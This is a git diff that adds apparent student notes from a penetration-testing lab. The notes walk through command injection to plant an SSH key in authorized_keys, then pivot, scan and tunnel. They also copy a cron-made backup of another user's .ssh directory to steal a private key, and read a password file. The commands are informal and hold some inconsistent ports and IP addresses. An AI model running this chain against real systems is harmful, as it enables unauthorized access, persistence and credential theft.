@@ -498,3 +498,85 @@ LPORT is RHP used in MSFCONSOLE
 
 ```
 
+
+# Review EXTRANET, INTRANET, INTERNAL
+
+## EXTRANET SSH KEY INJECTION and PIVOT to NEXT
+1. locate a way to ls and cat /etc/passwd to find whoami and your home directory
+2. from here we can do our key regen command, cat to verify the command worked, and then copy it
+```
+ssh-keygen -t rsa -b 4096
+
+cat /home/student/.ssh/id_rsa.pub
+
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBRD3hLc4BF2uohXmOf7rVCRTCkP7y/yw4ndP8qwtsdFpcnmYChMMqTIRrFvtCdYoKA3axczyqYtivmvR5lAqNVkSeUi4pFHR4+w78iy4QwZ81IwVk5so+dgWggiHcvif5Z8DsAOmi818gYi60zm3+7dVSUeFWwna56kFDGrfH3r3+Dn4WiJwbh61NF6XWQtr/uujhyF1VI1fOQI5uDyGhoXiDqzAawaxb78glt9S9fX9jtQeDg0R9wj7fcFSsWSzkfURaY7LCvGeK/mt/ZNt1AIDNSmBpj+Kol6+ykKD4ZyyXf9pqoBRwGrcZX9FCBme04PpFnFYUflR/ZPPPFt8VlXjmC6xe9M11XIWwxihQy8TEe1Ua9Tm7wkYL9Rtxwqdt6V05V8GmOHrjftHJtOuZstMqLP3fr/si66viXT4rUDKFDV0hoNlOS7COgJ4K/pu7jwmOVDF2cVoOxUIy4uJApMeVKUwR68iW4WPC3oIGGuxXh9xRhGv/11rhXDhODiIsXRchPig/fBGGdr/qrKIjhoj/ng5oder1k8waqJaBj2Ac0wneiBSHLfgVFJ/R6WxAmKkQuek1KopHcCkaOd2/i57NmIa0lemrleP0AEHuZYDX113WzuB6N7C3qw1jZCT5S67j/n0FzT6rvwi7t/TI+eddfy6BolSCp+Mb2Dd9Lw== student@lin-ops
+
+```
+3. Once we have the ssh key we can now create a fake .ssh folder on trget where we will upload our key
+```
+cd /var/www      (GO TO USER HOME DIR)
+mkdir /var/www/.ssh              (CREATE A .ssh FOLDER)
+; echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBRD3hLc4BF2uohXmOf7rVCRTCkP7y/yw4ndP8qwtsdFpcnmYChMMqTIRrFvtCdYoKA3axczyqYtivmvR5lAqNVkSeUi4pFHR4+w78iy4QwZ81IwVk5so+dgWggiHcvif5Z8DsAOmi818gYi60zm3+7dVSUeFWwna56kFDGrfH3r3+Dn4WiJwbh61NF6XWQtr/uujhyF1VI1fOQI5uDyGhoXiDqzAawaxb78glt9S9fX9jtQeDg0R9wj7fcFSsWSzkfURaY7LCvGeK/mt/ZNt1AIDNSmBpj+Kol6+ykKD4ZyyXf9pqoBRwGrcZX9FCBme04PpFnFYUflR/ZPPPFt8VlXjmC6xe9M11XIWwxihQy8TEe1Ua9Tm7wkYL9Rtxwqdt6V05V8GmOHrjftHJtOuZstMqLP3fr/si66viXT4rUDKFDV0hoNlOS7COgJ4K/pu7jwmOVDF2cVoOxUIy4uJApMeVKUwR68iW4WPC3oIGGuxXh9xRhGv/11rhXDhODiIsXRchPig/fBGGdr/qrKIjhoj/ng5oder1k8waqJaBj2Ac0wneiBSHLfgVFJ/R6WxAmKkQuek1KopHcCkaOd2/i57NmIa0lemrleP0AEHuZYDX113WzuB6N7C3qw1jZCT5S67j/n0FzT6rvwi7t/TI+eddfy6BolSCp+Mb2Dd9Lw== student@lin-ops" >> /var/www/.ssh/authorized_keys
+
+^ THIS COMMAND COPIES OUT KEY WE GENERATED INTO AUTHORIZED KEYS
+
+
+NOW WE CAN AUTHENTICATE TO THIS BOX VIA PORT 2222 using the USER we added the SSH key to
+
+ssh www-data@127.0.0.1 -p 10005
+```
+
+## PIVOT to NEXT HOP and ENUM
+1. Once we have our keygen uploaded we can create a MS to that machine and enumerate the other hosts
+```
+cat /etc/hosts
+ip a
+ip n
+cat /etc/crontab
+
+```
+2. We found 192.138.150.253 so we enum with nmap and set up our Sockets to the services being hosts
+
+3. nmap -p 1-50000
+4. To verify ports we can proxychains nc <target> port
+
+
+## STEAL KEY
+From doing cat /etc/crontab we see a file 
+#
+*  *    * * *   root    tar -C /home/comrade/ -czf /tmp/backup.tar.gz .ssh/
+
+
+WE copy this to our LINOPS
+student@lin-ops:~$ scp -P 10005 www-data@127.0.0.1:/tmp/backup.tar.gz .
+backup.tar.gz    
+
+Now we create a mkdir stolenkey (DIRECTORY) and unzip this copied file over (tar -xvzf backup.tar.gz -C stolenkey)
+
+Now we stole the key tunnel to the 192.168.150.253 SSH port using the following command to authenticate
+ssh -S /tmp/TG2 dynamic -O forward -L 10007:192.168.150.253:3201
+ ssh -i /home/student/stolenkey/.ssh/id_rsa comrade@127.0.0.1 -p 10007
+
+
+## Donovian INTRANET 192.168.150.253 3201 ENUM 
+1. comrade@lin:~$ cat password.txt 
+comrade::StudentMidwayPassword
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
